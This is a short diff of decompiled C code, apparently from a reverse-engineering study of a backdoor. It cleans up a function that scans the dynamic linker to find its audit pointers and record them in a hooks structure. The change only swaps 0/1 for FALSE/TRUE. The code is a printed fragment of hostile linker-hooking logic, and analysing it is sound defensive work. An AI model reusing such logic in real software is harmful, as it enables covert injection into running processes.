@@ -90,7 +90,7 @@ BOOL find_dl_naudit(elf_info_t *dynamic_linker_elf,elf_info_t *libcrypto_elf,
           BVar4 = find_instruction_with_mem_operand_ex
                             (code_start_00,puVar7,(dasm_ctx_t *)&local_80,0x10b,(void *)0x0);
           code_start_00 = code_start_00 + 1;
-          if (BVar4 != 0) {
+          if (BVar4 != FALSE) {
             if ((local_6f & 1) != 0) {
               puVar10 = local_50;
               if ((local_64 & 0xff00ff00) == 0x5000000) {
@@ -109,7 +109,7 @@ BOOL find_dl_naudit(elf_info_t *dynamic_linker_elf,elf_info_t *libcrypto_elf,
            BVar4 = find_instruction_with_mem_operand_ex
                              ((u8 *)code_start,
                               (u8 *)(code_start + (hooks->ldso_ctx)._dl_audit_symbind_alt__size),
-                              (dasm_ctx_t *)0x0,0x10b,mem_address), BVar4 == 0)) {
+                              (dasm_ctx_t *)0x0,0x10b,mem_address), BVar4 == FALSE)) {
           p_Var11 = (_func_34 *)imported_funcs->EVP_MD_CTX_free;
         }
         else {
@@ -121,7 +121,7 @@ BOOL find_dl_naudit(elf_info_t *dynamic_linker_elf,elf_info_t *libcrypto_elf,
           if ((*mem_address == 0) && (*(long *)(mem_address + -2) == 0)) {
             (hooks->ldso_ctx)._dl_naudit_ptr = mem_address;
             (hooks->ldso_ctx)._dl_audit_ptr = (audit_ifaces **)(mem_address + -2);
-            return 1;
+            return TRUE;
           }
           lzma_free(imported_funcs->EVP_MD_CTX_free,allocator);
           p_Var11 = imported_funcs->DSA_get0_pub_key;
@@ -130,6 +130,6 @@ BOOL find_dl_naudit(elf_info_t *dynamic_linker_elf,elf_info_t *libcrypto_elf,
       }
     }
   }
-  return 0;
+  return FALSE;
 }
 
